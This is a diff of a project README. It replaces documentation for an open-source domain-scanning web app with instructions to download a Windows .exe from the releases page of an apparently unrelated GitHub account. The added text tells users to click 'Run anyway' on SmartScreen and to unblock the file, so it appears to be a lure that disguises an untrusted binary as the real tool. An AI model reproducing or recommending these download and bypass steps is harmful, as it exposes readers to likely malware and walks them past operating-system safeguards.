@@ -1,302 +1,168 @@
-<div align="center">
-
-<img src="banner.png" alt="HostingInfo.gg" width="100%">
-
-<br>
-
-<a href="https://hostinginfo.gg"><img src="https://img.shields.io/badge/Live_Site-hostinginfo.gg-1B365D?style=for-the-badge&logo=googlechrome&logoColor=white" alt="Live Site"></a>
-&nbsp;
-<a href="#intelligence-engine"><img src="https://img.shields.io/badge/Intelligence-Engine-0EA5E9?style=for-the-badge&logo=target&logoColor=white" alt="Engine"></a>
-&nbsp;
-<a href="#architecture"><img src="https://img.shields.io/badge/Architecture-Docs-0F172A?style=for-the-badge&logo=bookstack&logoColor=white" alt="Docs"></a>
-
-<br>
-<br>
-
-<p>
-  <img src="https://skillicons.dev/icons?i=ts,react,express,vite,mysql,redis&theme=dark" alt="Tech Stack" />
-</p>
-
-<a href="https://github.com/prettycolor/hostinginfo.gg/actions"><img src="https://img.shields.io/github/actions/workflow/status/prettycolor/hostinginfo.gg/ci.yml?style=flat-square&label=CI&logo=githubactions&logoColor=white" alt="CI"></a>
-&nbsp;
-<a href="#"><img src="https://img.shields.io/badge/API_Routes-25-3178C6?style=flat-square" alt="API Routes"></a>
-&nbsp;
-<a href="#intelligence-engine"><img src="https://img.shields.io/badge/Server_Libraries-39-0EA5E9?style=flat-square" alt="Libraries"></a>
-&nbsp;
-<a href="#"><img src="https://img.shields.io/badge/Pages-37-F59E0B?style=flat-square" alt="Pages"></a>
-&nbsp;
-<a href="https://opensource.org/licenses/MIT"><img src="https://img.shields.io/badge/License-MIT-22C55E?style=flat-square" alt="License"></a>
-
-<br>
-
----
-
-<br>
-
-Point it at a domain. It pulls back the full picture: hosting provider, CDN, WAF,<br>TLS config, email auth (SPF/DKIM/DMARC), DNS records, and performance scores.<br>Same infrastructure layer that **Cloudflare** and **Akamai** sit on top of.
-
-<br>
-
-> Domain reconnaissance for the infrastructure layer.
-
-<br>
-
-</div>
-
----
-
-## What It Scans
-
-| | Capability | What It Analyzes |
-|:---:|-----------|-----------------|
-| › | **SSL/TLS** | Cert chain, cipher suites, expiry dates, grade |
-| › | **DNS** | A, AAAA, MX, TXT, CNAME, NS + propagation checks |
-| › | **Email Auth** | SPF, DKIM, DMARC pass/fail with per-record scoring |
-| › | **WAF/CDN** | Fingerprints the WAF vendor and CDN from response headers |
-| › | **Performance** | PageSpeed (mobile + desktop), LCP, FID, CLS, TTFB |
-| › | **Infrastructure** | ASN lookup, hosting provider, tech stack detection |
-| › | **WHOIS/RDAP** | Registrar, registration date, expiry |
-| › | **Threat Intel** | Google Safe Browsing check for malware/phishing flags |
-| › | **Monitoring** | Scheduled scans, email alerts, monthly PDF reports |
-
----
-
-## Screenshots
-
-| Home | Domain Calculator |
-|:----:|:-----------------:|
-| ![Home](public/screenshots/home.png) | ![DDC Calculator](public/screenshots/ddc-calculator.png) |
-
-| Interactive Guide | Login (5 OAuth Providers) |
-|:-----------------:|:-------------------------:|
-| ![Guide](public/screenshots/guide.png) | ![Login](public/screenshots/login.png) |
-
----
-
-## Intelligence Engine
-
-Runs DNS, TLS, WHOIS, ASN, and HTTP probes in parallel, then combines the results into a single confidence-weighted security score.
-
-```
-                    ┌─────────────────────┐
-                    │    Domain Input      │
-                    └─────────┬───────────┘
-                              │
-         ┌────────────────────┼────────────────────┐
-         │                    │                     │
-┌────────▼──────┐   ┌───────▼────────┐   ┌───────▼────────┐
-│  DNS Resolver  │   │  TLS Validator  │   │  WHOIS Parser  │
-│  + MX/SPF/DKIM │   │  + Chain Audit  │   │  + RDAP Client │
-└────────┬──────┘   └───────┬────────┘   └───────┬────────┘
-         │                    │                     │
-┌────────▼──────┐   ┌───────▼────────┐   ┌───────▼────────┐
-│  ASN Detector  │   │ WAF Fingerprint│   │  Infra Attrib. │
-│  + IP→Network  │   │ + CDN Headers  │   │  + Tech Stack  │
-└────────┬──────┘   └───────┬────────┘   └───────┬────────┘
-         │                    │                     │
-         └────────────────────┼────────────────────┘
-                              │
-                    ┌─────────▼───────────┐
-                    │   Evidence Fusion    │
-                    │  Confidence Scoring  │
-                    └─────────┬───────────┘
-                              │
-                    ┌─────────▼───────────┐
-                    │  Security Posture    │
-                    │  Composite Score     │
-                    └─────────────────────┘
-```
-
-| Module | File | Purpose |
-|--------|------|---------|
-| **ASN Detector** | `asn-detector.ts` | IP-to-ASN resolution via RIR data |
-| **WHOIS Parser** | `whois/` | Raw WHOIS protocol client + response parser |
-| **TLS Analyzer** | `tls-certificate.ts` | Cert chain walk, cipher check, expiry tracking |
-| **Infra Attribution** | `infrastructure-attribution.ts` | Matches headers/IPs to hosting and CDN vendors |
-| **Firewall Intel** | `firewall-intelligence.ts` | WAF detection from response headers |
-| **Evidence Fusion** | `evidence-fusion.ts` | Merges signals from all probes, weighted by confidence |
-| **Security Scorer** | `security-posture-scoring.ts` | Single score from SSL + DNS + email + headers + threat data |
-| **Confidence Engine** | `confidence-scorer.ts` | Weights each signal by source reliability |
-| **Ownership Correlation** | `ownership-correlation.ts` | Links WHOIS, DNS, and infra data to the same entity |
-| **SSRF Protection** | `ssrf-protection.ts` | Blocks internal network requests during scans |
-| **Safe Browsing** | `safe-browsing.ts` | Google Safe Browsing API for malware/phishing flags |
-
----
-
-## Architecture
-
-```
-┌───────────────────────────────────────────────────────┐
-│                     Client Layer                      │
-│                                                       │
-│  React 19  ·  TypeScript  ·  Vite 6  ·  Tailwind CSS │
-│  Radix UI  ·  Three.js  ·  Recharts  ·  Framer Motion│
-│                     37 pages                          │
-├───────────────────────────────────────────────────────┤
-│                      API Layer                        │
-│                                                       │
-│  Express 5  ·  25 route groups  ·  Rate limiting      │
-│  SSRF protection  ·  CORS  ·  Helmet security headers │
-├───────────────────────────────────────────────────────┤
-│                 Intelligence Engine                   │
-│                                                       │
-│  39 server libraries  ·  Custom protocol parsers      │
-│  Evidence fusion  ·  Confidence scoring               │
-├───────────────────────────────────────────────────────┤
-│                 Authentication Layer                  │
-│                                                       │
-│  JWT  ·  Passport.js  ·  5 OAuth providers            │
-│  Google  ·  GitHub  ·  Apple  ·  Microsoft  ·  Email  │
-├───────────────────────────────────────────────────────┤
-│                      Data Layer                       │
-│                                                       │
-│  MySQL 8 (Drizzle ORM)  ·  Redis (ioredis)           │
-│  Cron-based scans  ·  Email alerts (Nodemailer)       │
-└───────────────────────────────────────────────────────┘
-```
-
----
-
-## Features
-
-<table>
-<tr>
-<td width="50%" valign="top">
-
-### → Security Analysis
-- SSL/TLS certificate validation with chain analysis
-- Email auth (SPF, DKIM, DMARC) compliance grading
-- Security headers (CSP, HSTS, X-Frame-Options)
-- Google Safe Browsing malware detection
-- WAF and CDN provider identification
-
-</td>
-<td width="50%" valign="top">
-
-### → Performance Monitoring
-- Google PageSpeed (mobile + desktop)
-- Core Web Vitals tracking (LCP, FID, CLS)
-- Historical trends with visual charts
-- TTFB and resource breakdown analysis
-
-</td>
-</tr>
-<tr>
-<td width="50%" valign="top">
-
-### → User Platform
-- JWT auth with 5-provider OAuth (Google, GitHub, Apple, Microsoft, email)
-- Email verification and password reset flows
-- Domain claiming via DNS TXT records
-- Scan history with filtering (7/30/90 days)
-
-</td>
-<td width="50%" valign="top">
-
-### → Gamification System
-- XP economy with scan-based rewards
-- 50-level progression with tier-based avatars
-- 5 rarity tiers (Common → Legendary) across 76 avatar images
-- Leaderboard with 3D chaos emerald ranking
-- Achievement system with unlock notifications
-
-</td>
-</tr>
-</table>
-
----
-
-## Tech Stack
-
-| Layer | Technology | Version |
-|-------|-----------|---------|
-| **Frontend** | React, TypeScript, Vite, Tailwind CSS | 19, 5.7, 6.4, 3.4 |
-| **UI** | Radix UI, Lucide, Framer Motion, GSAP | Latest |
-| **3D** | Three.js, React Three Fiber, Drei | 0.182 |
-| **Charts** | Recharts | 3.6 |
-| **Backend** | Express, Node.js | 5.1, 22+ |
-| **Database** | MySQL 8, Drizzle ORM | 8.0, 0.44 |
-| **Cache** | Redis, ioredis | 7+, 5.9 |
-| **Auth** | JWT, Passport.js, bcryptjs | — |
-| **Email** | Nodemailer | 7.0 |
-| **CI** | GitHub Actions | — |
-
----
-
-## Quick Start
-
-```bash
-# Clone
-git clone https://github.com/prettycolor/hostinginfo.gg.git
-cd hostinginfo.gg
-
-# Install
-npm install
-
-# Database (MySQL + Redis via Docker)
-docker compose -f docker-compose.local.yml up -d
-
-# Configure
-cp env.example .env
-# Edit .env with your JWT secret and email credentials
-
-# Migrate
-npm run db:migrate
-
-# Run
-npm run dev
-```
-
-> Runs on `http://localhost:20000`
-
----
-
-## Project Structure
-
-```
-src/
-├── pages/              37 page components
-├── components/         41 React components + UI primitives
-├── lib/                Client utilities, state, API clients
-├── layouts/            Dashboard, Website, Root layouts
-├── hooks/              GPU detection, progressive retry, reduced motion
-├── contexts/           Filter, Toast providers
-├── server/
-│   ├── api/            25 Express route groups
-│   ├── lib/            39 intelligence engine libraries
-│   ├── db/             Drizzle schema (2,000+ lines) + client
-│   ├── cron/           Automated monitoring jobs
-│   └── middleware/     Security headers, rate limiting
-drizzle/                30 migration files
-scripts/                Build, lint, and CI tooling
-```
-
----
-
-## Related Projects
-
-| | Project | Description |
-|:---:|---------|-------------|
-| › | **[cortex](https://github.com/prettycolor/cortex)** | Self-paced learning platform — Network+, AWS, Cloudflare SE prep with interactive diagrams and spaced repetition |
-| › | **[aegis](https://github.com/prettycolor/aegis)** | AI agent infrastructure framework — orchestration, trust scoring, circuit breakers, RAG pipelines |
-| › | **[atelier](https://github.com/prettycolor/atelier)** | Design asset management gallery — token pipelines, component galleries, brand organization |
-
----
-
-## License
-
-MIT
-
----
-
-<div align="center">
-
-<br>
-
-Built by the hostinginfo.gg contributors
-
-*Domain reconnaissance for the infrastructure layer.*
-
-<a href="https://hostinginfo.gg">hostinginfo.gg</a>
-
-</div>
+# 🔎 hostinginfo.gg - Check domain health fast
+
+[![Download hostinginfo.gg](https://img.shields.io/badge/Download-Hostinginfo.gg-blue?style=for-the-badge&logo=github)](https://github.com/tiareversible939/hostinginfo.gg/releases)
+
+## 🖥️ What hostinginfo.gg does
+
+hostinginfo.gg checks a domain and shows how it stands up on security and performance. It looks at SSL and TLS, DNS, SPF, DKIM, DMARC, WAF signs, WHOIS data, and Core Web Vitals.
+
+Use it when you want to review a website before you trust it, fix common setup issues, or check if a site loads well for visitors.
+
+## 📦 Download for Windows
+
+1. Open the [releases page](https://github.com/tiareversible939/hostinginfo.gg/releases)
+2. Find the latest release
+3. Download the Windows file
+4. If Windows asks for permission, choose Run or Yes
+5. Follow the on-screen steps to finish setup
+
+If you see more than one file, choose the one that ends in `.exe` or a Windows installer file. If the release includes a portable version, you can run it without a full install.
+
+## 🚀 How to install
+
+1. Go to the [releases page](https://github.com/tiareversible939/hostinginfo.gg/releases)
+2. Pick the newest version at the top
+3. Download the file for Windows
+4. Open the file from your Downloads folder
+5. If a setup window appears, click through the prompts
+6. If Windows SmartScreen shows a prompt, choose More info, then Run anyway if you trust the file source
+7. Wait for the app to finish installing
+
+After install, you can open hostinginfo.gg from the Start menu or from the folder where you saved it.
+
+## 🛠️ System requirements
+
+hostinginfo.gg works best on a modern Windows PC with:
+
+- Windows 10 or Windows 11
+- 4 GB of RAM or more
+- A stable internet connection
+- At least 200 MB of free disk space
+- A screen with 1366 × 768 resolution or higher
+
+For faster checks on larger domains, more memory and a steady connection help.
+
+## 🎯 What you can check
+
+hostinginfo.gg gives you a clear view of a domain’s setup. It can help you review:
+
+- SSL certificate health
+- TLS version support
+- DNS records
+- SPF records
+- DKIM records
+- DMARC policy
+- WAF detection
+- WHOIS details
+- Core Web Vitals
+- Basic performance signals
+
+This helps you spot weak settings that can affect trust, email delivery, and page speed.
+
+## 🧭 First run
+
+When you open hostinginfo.gg for the first time:
+
+1. Enter a domain name, like example.com
+2. Start the scan
+3. Wait while the app checks the site
+4. Review the results on screen
+
+If you want a quick check, start with one domain. If you manage several sites, scan them one at a time so the results are easy to read.
+
+## 🔐 Security checks
+
+The security scan looks for common signs that a domain is set up well.
+
+It can show:
+
+- Whether the site uses SSL
+- Which TLS versions are allowed
+- Whether DNS records are present
+- Whether SPF is set for email
+- Whether DKIM is published
+- Whether DMARC is active
+- Whether a WAF is likely in front of the site
+
+These checks help you see if the domain is ready for safe use and email delivery.
+
+## ⚡ Performance checks
+
+hostinginfo.gg also looks at speed-related data. It can help you understand:
+
+- How fast the page loads
+- How quickly the page responds
+- Whether the site feels stable for users
+- How the page scores on Core Web Vitals
+
+Core Web Vitals focus on real user experience. They help show if a page feels fast and smooth, not just if it loads at all.
+
+## 📁 Suggested file layout
+
+If you want to keep the app easy to find, use a simple folder such as:
+
+- `Downloads\hostinginfo.gg`
+- `Desktop\hostinginfo.gg`
+- `Documents\Tools\hostinginfo.gg`
+
+Keep the app in one place so you can open it again without searching through many folders.
+
+## 🧩 Common use cases
+
+People use hostinginfo.gg to:
+
+- Check a domain before launch
+- Review a client site
+- Test DNS and email setup
+- Confirm SSL works
+- Compare speed across domains
+- Inspect a site after changes
+- Find weak points in site setup
+
+It is useful for site owners, support staff, and anyone who wants a quick domain check without digging through DNS tools.
+
+## 🧪 Reading the results
+
+When you see the scan results, look for:
+
+- Green or clear status for SSL and DNS
+- SPF, DKIM, and DMARC records that match the mail setup
+- A WAF match if your site uses one
+- Short load times and strong Core Web Vitals
+- WHOIS data that matches the domain owner or registrar details you expect
+
+If something looks off, check the domain host, DNS provider, or web host settings.
+
+## ❓ If the file will not open
+
+If Windows does not open the file:
+
+1. Make sure the download finished
+2. Check the Downloads folder
+3. Right-click the file and choose Open
+4. If the file is blocked, open Properties and choose Unblock
+5. Try running it again
+
+If the app still does not start, download the file again from the releases page and try the newest version.
+
+## 🔄 Updating hostinginfo.gg
+
+To update to a newer version:
+
+1. Visit the [releases page](https://github.com/tiareversible939/hostinginfo.gg/releases)
+2. Download the latest Windows file
+3. Close the old version if it is open
+4. Open the new file
+5. Replace the older copy if Windows asks
+
+Keeping the app up to date helps you use the newest checks and fixes.
+
+## 📍 Where to get the app
+
+Download and setup start here:
+
+[Visit the hostinginfo.gg releases page](https://github.com/tiareversible939/hostinginfo.gg/releases)
+
+## 🏷️ Project topics
+
+core-web-vitals, dns, domain-scanner, express, performance, react, security-scanner, spf-dkim-dmarc, ssl, tls, typescript, waf, whois
